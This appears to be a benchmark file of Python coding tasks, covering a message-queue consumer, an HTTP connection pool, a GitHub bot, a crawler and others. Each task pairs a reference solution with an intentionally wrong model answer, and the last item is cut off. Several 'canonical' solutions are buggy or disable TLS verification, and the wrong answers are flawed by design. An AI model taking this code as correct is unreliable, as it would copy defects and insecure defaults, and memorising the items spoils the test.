[
  {
    "Task_id": 1,
    "Instruction": "Task Description: Create a Python class that implements an ActiveMQ consumer using the STOMP protocol to listen for messages from a specified queue or topic in an Artemis message broker.\n\nClass Description: The MessageArtemisExtension class provides functionality to establish a connection with an Artemis message broker and subscribe to a specified destination (queue/topic) to receive messages. It maintains connection objects and handles message listening through a custom listener.\n\nAttributes:\nconns: List[stomp.Connection] - Class attribute that stores all connection objects created by instances of this class\nconn: stomp.Connection - Instance attribute representing the current connection to the message broker\n\nMethods:\nlisten_queue(profile: dict) -> None - Establishes a connection to the Artemis broker and subscribes to the specified destination\n    Input:\n        profile: dict - A dictionary containing connection parameters with the following optional keys:\n            host: str - Broker host address (default: \"127.0.0.1\")\n            port: int - Broker port number (default: 61616)\n            username: str - Authentication username (default: \"artemis\")\n            password: str - Authentication password (default: \"artemis\")\n            destination: str - Queue/topic name to subscribe to (default: \"arkid\")\n    Output: None - The method establishes the connection and subscription but doesn't return any value",
    "Canonical_solution": "import stomp\nfrom typing import List\n\nclass MessageArtemisExtension:\n    conns = []\n    \n    def __init__(self):\n        self.conn = None\n        \n    def listen_queue(self, profile: dict):\n        if not profile:\n            return\n            \n        self.conn = stomp.Connection(\n            host_and_ports=[\n                (\n                    profile.get(\"host\",\"127.0.0.1\"), \n                    profile.get(\"port\",61616)\n                )\n            ],\n            heartbeats=(6000, 12000)\n        )\n        self.conn.set_listener('', MessageListener())\n        self.conn.connect(\n            profile.get(\"username\",\"artemis\"), \n            profile.get(\"password\",\"artemis\"), \n            wait=True,\n            headers={\"client-id\": \"arkid\"},\n        )\n        self.conn.subscribe(\n            destination=profile.get(\"destination\",\"arkid\"),\n            id=profile.get(\"destination\",\"arkid\"),\n            ack=\"auto\",\n            headers={\n                'subscription-type': 'ANYCAST',\n                'durable-subscription-name': f'arkid.{profile.get(\"destination\",\"arkid\")}',\n            },\n        )",
    "Code_level": "Class-level",
    "FSMID_for_test": 81,
    "wrong_result": "class MessageArtemisExtension:\n    conns = []\n\n    def __init__(self):\n        self.conn = None\n\n    def listen_queue(self, profile):\n        host = profile.get('host', '127.0.0.1')\n        port = profile.get('port', 61616)\n        username = profile.get('username', 'artemis')\n        password = profile.get('password', 'artemis')\n        destination = profile.get('destination', 'arkid')\n\n        self.conn = stomp.Connection([f\"{host}:{port}\"])\n        self.conns.append(self.conn)\n        self.conn.connect(username, password)\n        self.conn.subscribe(destination, 1)\n        self.conn.on_message = self.on_message\n\n    def on_message(self, frame):\n        print(f\"Received message: {frame.body}\")"
  },
  {
    "Task_id": 10,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages reusable HTTP connections to a server, handling connection creation, retrieval, and release, along with request execution and response handling.\n\nClass Description: HTTPConnectionPool is a connection pooling mechanism for HTTP clients that manages a pool of persistent connections to a specified host, improving performance by reusing connections. It handles connection lifecycle, retries, timeouts, and proxy configurations.\n\nAttributes:\n- scheme: str - The URL scheme (default \"http\")\n- ConnectionCls: class - The connection class to use (default HTTPConnection)\n- ResponseCls: class - The response class to use (default HTTPResponse)\n- host: str - The target server hostname\n- port: int - The target server port\n- timeout: Timeout - Connection and read timeout configuration\n- retries: Retry - Retry configuration for failed requests\n- pool: LifoQueue - The connection pool storage\n- block: bool - Whether to block when pool is full\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with configuration parameters\n- _new_conn() -> HTTPConnection - Creates a new connection instance\n- _get_conn(timeout=None) -> HTTPConnection - Retrieves a connection from the pool or creates a new one\n- _put_conn(conn) -> None - Returns a connection to the pool\n- _make_request(conn, method, url, timeout=_Default, **httplib_request_kw) -> HTTPResponse - Executes an HTTP request using the specified connection\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, **response_kw) -> HTTPResponse - Main method to execute HTTP requests with connection pooling\n- close() -> None - Closes all connections in the pool",
    "Canonical_solution": "import socket\nimport errno\nfrom socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .util.timeout import Timeout\nfrom .util.retry import Retry\nfrom .util.url import parse_url\nfrom .response import HTTPResponse\nfrom .exceptions import (\n    EmptyPoolError,\n    ClosedPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    TimeoutError,\n    SSLError,\n    ProxyError,\n    CertificateError,\n    HTTPException,\n    NewConnectionError\n)\nfrom ._collections import HTTPHeaderDict\nfrom .util.queue import LifoQueue\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.request import set_file_position\nfrom .util.response import assert_header_parsing\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n    ResponseCls = HTTPResponse\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        strict=False,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.pool = LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n\n        for _ in range(maxsize):\n            self.pool.put(None)\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            strict=self.strict,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n            if conn and is_connection_dropped(conn):\n                conn.close()\n                conn = None\n            return conn or self._new_conn()\n        except AttributeError:\n            raise ClosedPoolError(self, \"Pool is closed.\")\n        except queue.Empty:\n            if self.block:\n                raise EmptyPoolError(self, \"Pool reached maximum size and no more connections are allowed.\")\n            return self._new_conn()\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except AttributeError:\n            pass\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            conn.request(method, url, **httplib_request_kw)\n            httplib_response = conn.getresponse()\n            assert_header_parsing(httplib_response.msg)\n            return httplib_response\n        except (SocketTimeout, BaseSSLError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=conn.timeout)\n            raise\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        **response_kw\n    ):\n        parsed_url = parse_url(url)\n        if headers is None:\n            headers = self.headers\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, redirect=redirect, default=self.retries)\n\n        if assert_same_host and not self.is_same_host(url):\n            raise HostChangedError(self, url, retries)\n\n        conn = None\n        release_conn = True\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            http_tunnel_required = connection_requires_http_tunnel(\n                self.proxy, self.proxy_config, parsed_url.scheme\n            )\n\n            if not http_tunnel_required:\n                headers = headers.copy()\n                headers.update(self.proxy_headers)\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers\n            )\n\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn if not release_conn else None,\n                retries=retries,\n                **response_kw\n            )\n\n            return response\n\n        except (EmptyPoolError, TimeoutError, HTTPException, SocketError, ProtocolError) as e:\n            if conn:\n                conn.close()\n                conn = None\n            raise\n\n        finally:\n            if release_conn and conn:\n                self._put_conn(conn)\n\n    def close(self):\n        while True:\n            try:\n                conn = self.pool.get(block=False)\n                if conn:\n                    conn.close()\n            except queue.Empty:\n                break",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import queue\nfrom urllib3.util import Timeout, Retry\nfrom urllib3.connection import HTTPConnection\nfrom urllib3.response import HTTPResponse\n\nclass HTTPConnectionPool:\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.scheme = \"http\"\n        self.ConnectionCls = HTTPConnection\n        self.ResponseCls = HTTPResponse\n        self.host = host\n        self.port = port or 80\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = queue.LifoQueue(maxsize=maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.headers = headers or {}\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        conn = self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            **self.conn_kw\n        )\n        if self.proxy:\n            conn.set_proxy(self.proxy)\n        return conn\n\n    def _get_conn(self, timeout=None):\n        if self.pool.full() and not self.block:\n            raise Exception(\"Pool is full and blocking is False\")\n        return self.pool.get(timeout=timeout) if timeout else self.pool.get()\n\n    def _put_conn(self, conn):\n        self.pool.put(conn)\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        conn.request(method, url, **httplib_request_kw)\n        response = self.ResponseCls(conn.getresponse())\n        return response\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, **response_kw):\n        if retries is None:\n            retries = self.retries\n        if not headers:\n            headers = self.headers\n        conn = self._get_conn(timeout=pool_timeout)\n        try:\n            response = self._make_request(conn, method, url, timeout, **response_kw)\n            if redirect and response.status in (301, 302):\n                return response\n            return response\n        except Exception as e:\n            if retries and retries.attempt(e):\n                return self.urlopen(method, url, body, headers, retries, redirect, assert_same_host, timeout, pool_timeout, **response_kw)\n            raise\n\n    def close(self):\n        while not self.pool.empty():\n            conn = self.pool.get()\n            conn.close()"
  },
  {
    "Task_id": 102,
    "Instruction": "Task Description: Create a function that handles GitHub webhook events for pull requests, fetches a random meme from an API, and posts it as a comment on the pull request.\n\nFunction Description: The function `bot()` is a webhook handler that processes GitHub pull request events. When a pull request is opened, it authenticates with the GitHub API, fetches a random meme from an external API, and posts the meme as a comment on the pull request. The function uses the `requests` library for HTTP communication with the meme API and the `PyGithub` library for GitHub interactions.\n\nInput: \n- The function receives a Flask `request` object containing JSON payload from GitHub webhook. The payload includes:\n  - `action`: The event type (e.g., \"opened\")\n  - `pull_request`: Details about the pull request\n  - `repository`: Information about the repository containing owner and name\n\nOutput: \n- Returns \"ok\" string in all cases (success or failure) to acknowledge webhook receipt\n- As a side effect, posts a meme comment on the pull request when conditions are met",
    "Canonical_solution": "import os\nimport requests\nfrom dotenv import load_dotenv\nfrom flask import Flask, request\nfrom github import Github, GithubIntegration\n\nload_dotenv()\n\n__flask_app_name__ = 'github_bot'\napp = Flask(__flask_app_name__)\napp_id = int(os.environ['GITHUB_APP_ID'])\nwith open(\n        os.path.normpath(os.path.expanduser(os.getenv(\"GITHUB_PRIVATE_KEY_FILE\", '~/.certs/github/bot_key.pem'))),\n        'r'\n) as cert_file:\n    app_key = cert_file.read()\n\ngit_integration = GithubIntegration(\n    app_id,\n    app_key,\n)\n\ndef bot():\n    payload = request.json\n    if not all(k in payload.keys() for k in ['action', 'pull_request']) and \\\n            payload['action'] == 'opened':\n        return \"ok\"\n    owner = payload['repository']['owner']['login']\n    repo_name = payload['repository']['name']\n    git_connection = Github(\n        login_or_token=git_integration.get_access_token(\n            git_integration.get_installation(owner, repo_name).id\n        ).token\n    )\n    repo = git_connection.get_repo(f\"{owner}/{repo_name}\")\n    issue = repo.get_issue(number=payload['pull_request']['number'])\n    response = requests.get(url='https://meme-api.herokuapp.com/gimme')\n    if response.status_code != 200:\n        return 'ok'\n    meme_url = response.json()['preview'][-1]\n    issue.create_comment(f\"![Alt Text]({meme_url})\")\n    return \"ok\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nfrom github import Github\nfrom flask import request\nimport os\n\ndef bot():\n    data = request.get_json()\n    if data.get('action') != 'opened':\n        return 'ok'\n    g = Github(os.environ['GITHUB_TOKEN'])\n    pr_number = data['pull_request']['number']\n    pr = g.get_pull(pr_number)\n    try:\n        meme_response = requests.get('https://meme-api.com/gimme')\n        meme_url = meme_response.json()['url']\n    except:\n        pass\n    try:\n        pr.create_comment(f\"Here's a meme: {meme_url}\")\n    except:\n        pass\n    return 'ok'"
  },
  {
    "Task_id": 104,
    "Instruction": "Task Description: Create a function that performs HTTP requests using the Python requests library, handling different HTTP methods and processing both requests and responses appropriately.\n\nFunction Description: The function should make HTTP requests to a specified URL using a given HTTP method (GET, POST, PUT, DELETE, etc.). For GET requests, it should ignore any payload, while for other methods it should properly format and send a JSON payload if provided. The function should return the response status code, headers, and body in a structured format, or an error message if the request fails.\n\nInput:\n- method (str): The HTTP method to use (e.g., 'GET', 'POST', 'PUT', 'DELETE').\n- url (str): The target URL for the HTTP request.\n- payload_json (Optional[str]): A JSON string representing the request payload (ignored for GET requests).\n\nOutput:\n- dict: A dictionary containing:\n  - 'status_code' (int): The HTTP response status code.\n  - 'headers' (dict): The response headers as a dictionary.\n  - 'body' (str): The response body as text.\n  - OR 'error' (str): An error message if the request fails.",
    "Canonical_solution": "import os\nimport requests\nfrom typing import Optional\nfrom letta.utils import json_dumps, json_loads\n\ndef http_request(self, method: str, url: str, payload_json: Optional[str] = None):\n    \"\"\"\n    Generates an HTTP request and returns the response.\n\n    Args:\n        method (str): The HTTP method (e.g., 'GET', 'POST').\n        url (str): The URL for the request.\n        payload_json (Optional[str]): A JSON string representing the request payload.\n\n    Returns:\n        dict: The response from the HTTP request.\n    \"\"\"\n    try:\n        headers = {\"Content-Type\": \"application/json\"}\n\n        # For GET requests, ignore the payload\n        if method.upper() == \"GET\":\n            print(f\"[HTTP] launching GET request to {url}\")\n            response = requests.get(url, headers=headers)\n        else:\n            # Validate and convert the payload for other types of requests\n            if payload_json:\n                payload = json_loads(payload_json)\n            else:\n                payload = {}\n            print(f\"[HTTP] launching {method} request to {url}, payload=\\n{json_dumps(payload, indent=2)}\")\n            response = requests.request(method, url, json=payload, headers=headers)\n\n        return {\"status_code\": response.status_code, \"headers\": dict(response.headers), \"body\": response.text}\n    except Exception as e:\n        return {\"error\": str(e)}",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nimport json\n\ndef http_request(method, url, payload_json=None):\n    try:\n        if method == 'GET':\n            resp = requests.get(url)\n        else:\n            payload = json.loads(payload_json) if payload_json else None\n            resp = requests.request(method, url, json=payload)\n    except Exception as e:\n        return {'error': str(e)}\n    if 200 <= resp.status_code < 300:\n        return {\n            'status_code': resp.status_code,\n            'headers': dict(resp.headers),\n            'body': resp.text\n        }\n    else:\n        return {\n            'error': f\"Request failed with status code {resp.status_code}: {resp.text}\"\n        }"
  },
  {
    "Task_id": 106,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with a remote API, featuring automatic retries for failed requests, background polling for data refresh, and graceful shutdown handling.\n\nClass Description: The Fetcher class provides a robust HTTP client implementation for API interactions with features like exponential backoff retries, periodic background data refreshing, and proper thread cleanup on program exit.\n\nAttributes:\n- _base_url: str - The base URL for API endpoints\n- _api_key: str - API key for authentication\n- _stop_polling_event: Event - Threading event to control polling thread lifecycle\n- _exit_monitor: Thread - Thread that monitors main thread for program exit\n- _poller_thread: Thread - Thread that handles periodic data refreshing\n\nMethods:\n- __init__(base_url: str, api_key: str) -> None - Initializes the fetcher with API configuration\n- run() -> None - Starts the background polling and exit monitoring threads\n- post(api: str, body: Dict[str, str]) -> None - Sends a POST request to specified API endpoint\n- _fetch_url(url: str, api_key: str) -> Dict - Performs a GET request with retry logic (private)\n- _post_url(url: str, api_key: str, body: Dict[str, str]) -> None - Performs a POST request (private)\n- _thread_func(base_url: str, api_key: str, stop_polling_event: Event, seconds_interval: Optional[int]) -> None - Background polling thread function (private)\n- _refresh_data(base_url: str, api_key: str) -> None - Refreshes data from multiple endpoints (private)\n- _monitor_exit(exit_event: Event) -> None - Monitors main thread for program exit (private)",
    "Canonical_solution": "import logging\nimport os\nimport threading\nimport time\nimport typing\nimport requests\n\nfrom threading import Thread, Event\nfrom typing import Dict, Optional\nfrom tenacity import (\n    RetryError,\n    retry,\n    stop_after_attempt,\n    wait_exponential,\n    retry_if_exception,\n)\n\nclass Fetcher:\n    def __init__(self, base_url: str, api_key: str):\n        self._base_url = base_url\n        self._api_key = api_key\n        self._stop_polling_event = Event()\n        self._exit_monitor = Thread(\n            target=self._monitor_exit, args=(self._stop_polling_event,), daemon=True\n        )\n        self._poller_thread = Thread(\n            target=self._thread_func,\n            args=(\n                self._base_url,\n                self._api_key,\n                self._stop_polling_event,\n                int(os.getenv(\"TRACELOOP_PROMPT_MANAGER_POLLING_INTERVAL\") or 5),\n            ),\n        )\n\n    def run(self):\n        self._refresh_data(self._base_url, self._api_key)\n        self._exit_monitor.start()\n        self._poller_thread.start()\n\n    def post(self, api: str, body: Dict[str, str]):\n        self._post_url(f\"{self._base_url}/v1/traceloop/{api}\", self._api_key, body)\n\n    @retry(\n        wait=wait_exponential(multiplier=1, min=4),\n        stop=stop_after_attempt(int(os.getenv(\"TRACELOOP_PROMPT_MANAGER_MAX_RETRIES\") or 3)),\n        retry=retry_if_exception(lambda e: isinstance(e, requests.exceptions.HTTPError) and (500 <= e.response.status_code < 600),\n    )\n    def _fetch_url(self, url: str, api_key: str):\n        response = requests.get(\n            url,\n            headers={\n                \"Authorization\": f\"Bearer {api_key}\",\n                \"X-Traceloop-SDK-Version\": \"1.0.0\",\n            },\n        )\n\n        if response.status_code != 200:\n            if response.status_code == 401 or response.status_code == 403:\n                logging.error(\"Authorization error: Invalid Traceloop API key.\")\n                raise requests.exceptions.HTTPError(response=response)\n            else:\n                logging.error(\"Request failed: %s\", response.status_code)\n                raise requests.exceptions.HTTPError(response=response)\n        else:\n            return response.json()\n\n    def _post_url(self, url: str, api_key: str, body: Dict[str, str]):\n        response = requests.post(\n            url,\n            headers={\n                \"Authorization\": f\"Bearer {api_key}\",\n                \"X-Traceloop-SDK-Version\": \"1.0.0\",\n            },\n            json=body,\n        )\n\n        if response.status_code != 200:\n            raise requests.exceptions.HTTPError(response=response)\n\n    def _thread_func(self, base_url: str, api_key: str, stop_polling_event: Event, seconds_interval: Optional[int] = 5):\n        while not stop_polling_event.is_set():\n            try:\n                self._refresh_data(base_url, api_key)\n            except RetryError:\n                logging.error(\"Request failed after retries : stopped polling\")\n                break\n\n            time.sleep(seconds_interval)\n\n    def _refresh_data(self, base_url: str, api_key: str):\n        self._fetch_url(f\"{base_url}/v1/traceloop/prompts\", api_key)\n        self._fetch_url(f\"{base_url}/v1/traceloop/pii/tracing-allow-list\", api_key)\n\n    def _monitor_exit(self, exit_event: Event):\n        main_thread = threading.main_thread()\n        main_thread.join()\n        exit_event.set()",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import threading\nimport time\nimport requests\nfrom typing import Dict, Optional\n\nclass Fetcher:\n    def __init__(self, base_url: str, api_key: str) -> None:\n        self._base_url = base_url\n        self._api_key = api_key\n        self._stop_polling_event = threading.Event()\n        self._exit_monitor = threading.Thread(target=self._monitor_exit, args=(self._stop_polling_event,), daemon=True)\n        self._poller_thread = threading.Thread(target=self._thread_func, args=(self._base_url, self._api_key, self._stop_polling_event, 60), daemon=True)\n    \n    def run(self) -> None:\n        self._exit_monitor.start()\n        self._poller_thread.start()\n    \n    def post(self, api: str, body: Dict[str, str]) -> None:\n        url = f\"{self._base_url}/{api}\"\n        self._post_url(url, self._api_key, body)\n    \n    def _fetch_url(self, url: str, api_key: str) -> Dict:\n        retries = 3\n        delay = 1\n        for i in range(retries):\n            try:\n                response = requests.get(url, headers={'Authorization': f'Bearer {api_key}'})\n                response.raise_for_status()\n                return response.json()\n            except requests.RequestException as e:\n                if i == retries - 1:\n                    raise\n                time.sleep(delay)\n                delay *= 2\n        return {}\n    \n    def _post_url(self, url: str, api_key: str, body: Dict[str, str]) -> None:\n        retries = 3\n        delay = 1\n        for i in range(retries):\n            try:\n                response = requests.post(url, json=body, headers={'Authorization': f'Bearer {api_key}'})\n                response.raise_for_status()\n            except requests.RequestException as e:\n                if i == retries - 1:\n                    raise\n                time.sleep(delay)\n                delay *= 2\n    \n    def _thread_func(self, base_url: str, api_key: str, stop_polling_event: threading.Event, seconds_interval: int) -> None:\n        while not stop_polling_event.is_set():\n            self._refresh_data(base_url, api_key)\n            time.sleep(seconds_interval)\n    \n    def _refresh_data(self, base_url: str, api_key: str) -> None:\n        endpoints = [\n            f\"{base_url}/data\",\n            f\"{base_url}/info\"\n        ]\n        for endpoint in endpoints:\n            self._fetch_url(endpoint, api_key)\n    \n    def _monitor_exit(self, exit_event: threading.Event) -> None:\n        while True:\n            if not threading.main_thread().is_alive():\n                exit_event.set()\n                break\n            time.sleep(1)"
  },
  {
    "Task_id": 108,
    "Instruction": "Task Description: Implement a web crawler class that can fetch HTML content from single or multiple URLs, with support for threaded operations and error handling.\n\nClass Description: SimpleCrawler is a class designed to fetch HTML content from web pages either individually or in parallel using threading. It handles various HTTP request scenarios and errors while maintaining proper logging.\n\nAttributes:\n_results: dict - Stores fetched HTML content when operating in threaded mode\nMAX_FILE_SIZE: int - Maximum allowed file size for fetched content (20MB)\nMIN_FILE_SIZE: int - Minimum allowed file size for fetched content (10 bytes)\nLOGGER: Logger - Logger instance for error and debug messages\nUSER_AGENT: str - User agent string for HTTP requests\nHEADERS: dict - Default headers for HTTP requests\n\nMethods:\nfetch_url(url: str, request_args: dict = None) -> str - Fetches HTML content from a single URL\nInput:\n  url: str - URL to fetch\n  request_args: dict (optional) - Additional arguments for the request\nOutput:\n  str - HTML content of the URL or None if failed\n\n_fetch_url(url: str, is_threaded: bool, request_args: dict = None) -> str - Internal method that performs the actual URL fetching\nInput:\n  url: str - URL to fetch\n  is_threaded: bool - Flag indicating if operation is threaded\n  request_args: dict (optional) - Additional arguments for the request\nOutput:\n  str - HTML content of the URL or None if failed\n\nfetch_urls(urls: list, request_args: dict = None) -> dict - Fetches HTML content from multiple URLs in parallel using threads\nInput:\n  urls: list - List of URLs to fetch\n  request_args: dict (optional) - Additional arguments for the requests\nOutput:\n  dict - Dictionary mapping URLs to their HTML content",
    "Canonical_solution": "import socket\nimport copy\nimport threading\nimport logging\nimport requests\nimport urllib3\nfrom .response_decoder import decode_response\n\nMAX_FILE_SIZE = 20000000\nMIN_FILE_SIZE = 10\n\nLOGGER = logging.getLogger(__name__)\nUSER_AGENT = \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\"\nHEADERS = {\n    \"Connection\": \"close\",\n    \"User-Agent\": USER_AGENT,\n}\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\nclass SimpleCrawler:\n    _results = {}\n\n    def __init__(self):\n        pass\n\n    def fetch_url(self, url, request_args=None):\n        \"\"\"\n        Crawls the html content of the parameter url and returns the html\n        :param url: URL to fetch\n        :param request_args: optional arguments that `request` takes\n        :return: HTML content of the URL\n        \"\"\"\n        return self._fetch_url(url, False, request_args=request_args)\n\n    def _fetch_url(self, url, is_threaded, request_args=None):\n        \"\"\"\n        Crawls the html content of the parameter url and saves the html in _results\n        :param url: URL to fetch\n        :param is_threaded: If True, results will be stored for later processing\n        :param request_args: optional arguments that `request` takes\n        :return: html of the url\n        \"\"\"\n        if request_args is None:\n            request_args = {}\n        if \"headers\" not in request_args:\n            request_args[\"headers\"] = HEADERS\n\n        html_str = None\n        try:\n            response = requests.get(\n                url, verify=False, allow_redirects=True, **request_args)\n            \n            if response.status_code != 200:\n                LOGGER.error(\"not a 200 response: %s\", response.status_code)\n            elif response.text is None or len(response.text) < MIN_FILE_SIZE:\n                LOGGER.error(\"too small/incorrect: %s %s\", url, len(response.text))\n            elif len(response.text) > MAX_FILE_SIZE:\n                LOGGER.error(\"too large: %s %s\", url, len(response.text))\n            else:\n                html_str = decode_response(response)\n                \n        except (requests.exceptions.MissingSchema, requests.exceptions.InvalidURL):\n            LOGGER.error(\"malformed URL: %s\", url)\n        except requests.exceptions.TooManyRedirects:\n            LOGGER.error(\"too many redirects: %s\", url)\n        except requests.exceptions.SSLError as err:\n            LOGGER.error(\"SSL: %s %s\", url, err)\n        except (socket.timeout, requests.exceptions.ConnectionError, \n               requests.exceptions.Timeout, socket.error, socket.gaierror) as err:\n            LOGGER.error(\"connection/timeout error: %s %s\", url, err)\n            \n        if is_threaded:\n            self._results[url] = html_str\n        return html_str\n\n    def fetch_urls(self, urls, request_args=None):\n        \"\"\"\n        Crawls the html content of all given urls in parallel.\n        :param urls: List of URLs to fetch\n        :param request_args: optional arguments that `request` takes\n        :return: Dictionary of URL to HTML content mappings\n        \"\"\"\n        threads = [\n            threading.Thread(target=self._fetch_url, args=(url, True, request_args))\n            for url in urls\n        ]\n        for thread in threads:\n            thread.start()\n        for thread in threads:\n            thread.join()\n\n        results = copy.deepcopy(self._results)\n        self._results = {}\n        return results",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import threading\nimport requests\nimport logging\n\nclass SimpleCrawler:\n    def __init__(self):\n        self._results = {}\n        self.MAX_FILE_SIZE = 20 * 1024 * 1024\n        self.MIN_FILE_SIZE = 10\n        self.LOGGER = logging.getLogger('SimpleCrawler')\n        self.USER_AGENT = 'SimpleCrawler/1.0'\n        self.HEADERS = {'User-Agent': self.USER_AGENT}\n\n    def fetch_url(self, url, request_args=None):\n        result = self._fetch_url(url, is_threaded=False, request_args=request_args)\n        return result\n\n    def _fetch_url(self, url, is_threaded, request_args=None):\n        try:\n            headers = self.HEADERS.copy()\n            if request_args and 'headers' in request_args:\n                headers.update(request_args['headers'])\n            response = requests.get(url, headers=headers, **request_args)\n            response.raise_for_status()\n            content = response.content\n            if len(content) < self.MIN_FILE_SIZE or len(content) > self.MAX_FILE_SIZE:\n                self.LOGGER.warning(f\"Content size {len(content)} for {url} is out of bounds\")\n                self._results[url] = None\n                return None\n            self._results[url] = content.decode('utf-8')\n            return self._results[url]\n        except requests.exceptions.RequestException as e:\n            self.LOGGER.error(f\"Error fetching {url}: {str(e)}\")\n            self._results[url] = None\n            return None\n\n    def fetch_urls(self, urls, request_args=None):\n        self._results = {}\n        threads = []\n        for url in urls:\n            thread = threading.Thread(target=self._fetch_url, args=(url, True, request_args))\n            threads.append(thread)\n            thread.start()\n        for thread in threads:\n            thread.join()\n        return self._results"
  },
  {
    "Task_id": 109,
    "Instruction": "Task Description: Implement a Python class to interact with a Plex Media Server using HTTP requests, including functionality for making authenticated requests, validating server connections, and updating media libraries.\n\nClass Description: PlexMediaServer is a class that provides methods to communicate with a Plex Media Server instance. It handles HTTP requests with proper authentication, validates server connections and library access, and triggers library updates.\n\nAttributes:\n- TIMEOUT: [int] - Default timeout in seconds for HTTP requests\n- object: [object] - The media server instance containing configuration options\n\nMethods:\n- __init__(mediaserver_instance: object) -> None - Initializes the PlexMediaServer with a media server instance containing configuration options\n- make_request(uri: str = '/', params: dict = {}) -> requests.Response - Makes an authenticated HTTP GET request to the Plex server with proper headers and SSL verification handling\n- validate() -> bool - Validates the connection to the Plex server and checks if configured libraries exist, raising exceptions for any issues\n- update() -> bool - Triggers refresh operations for all configured libraries, raising exceptions for any failures",
    "Canonical_solution": "import requests\nfrom urllib.parse import urlsplit, urlunsplit, urlencode\nimport warnings\n\nclass PlexMediaServer:\n    TIMEOUT = 5\n\n    def __init__(self, mediaserver_instance):\n        self.object = mediaserver_instance\n\n    def make_request(self, uri='/', params={}):\n        headers = {'User-Agent': 'TubeSync'}\n        token = self.object.loaded_options['token']\n        params['X-Plex-Token'] = token\n        base_parts = urlsplit(self.object.url)\n        qs = urlencode(params)\n        url = urlunsplit((base_parts.scheme, base_parts.netloc, uri, qs, ''))\n        \n        if self.object.verify_https:\n            return requests.get(url, headers=headers, verify=True, timeout=self.TIMEOUT)\n        else:\n            with warnings.catch_warnings():\n                warnings.simplefilter(\"ignore\")\n                return requests.get(url, headers=headers, verify=False, timeout=self.TIMEOUT)\n\n    def validate(self):\n        try:\n            response = self.make_request('/library/sections')\n            if response.status_code != 200:\n                check_token = ''\n                if 400 <= response.status_code < 500:\n                    check_token = (' A 4XX error could mean your access token is being rejected.')\n                raise Exception(f'Invalid HTTP status code: {response.status_code}.' + check_token)\n            \n            parsed_response = ElementTree.fromstring(response.content)\n            remote_libraries = {}\n            for parent in parsed_response.iter('MediaContainer'):\n                for d in parent:\n                    library_id = d.attrib['key']\n                    library_name = d.attrib['title']\n                    remote_libraries[library_id] = library_name\n            \n            libraries = self.object.loaded_options['libraries'].strip().split(',')\n            for library_id in libraries:\n                library_id = library_id.strip()\n                if library_id not in remote_libraries:\n                    raise Exception(f'Library ID \"{library_id}\" does not exist on Plex Media Server')\n            return True\n            \n        except Exception as e:\n            raise Exception(f'Validation failed: {str(e)}')\n\n    def update(self):\n        libraries = self.object.loaded_options.get('libraries', '')\n        for library_id in libraries.split(','):\n            library_id = library_id.strip()\n            uri = f'/library/sections/{library_id}/refresh'\n            response = self.make_request(uri)\n            if response.status_code != 200:\n                raise Exception(f'Failed to refresh library \"{library_id}\", status code: {response.status_code}')\n        return True",
